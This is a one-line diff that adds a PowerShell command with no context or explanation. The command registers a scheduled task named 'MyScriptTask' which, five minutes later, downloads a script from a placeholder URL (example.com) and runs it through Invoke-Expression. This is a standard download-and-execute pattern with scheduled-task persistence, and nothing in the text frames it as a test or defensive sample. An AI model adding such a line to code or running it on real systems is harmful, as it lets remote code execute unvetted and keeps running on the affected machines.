@@ -1,0 +1,1 @@
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-Command "iex (New-Object Net.WebClient).DownloadString(''http://example.com/script.ps1'')"'; Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)) -TaskName 'MyScriptTask'
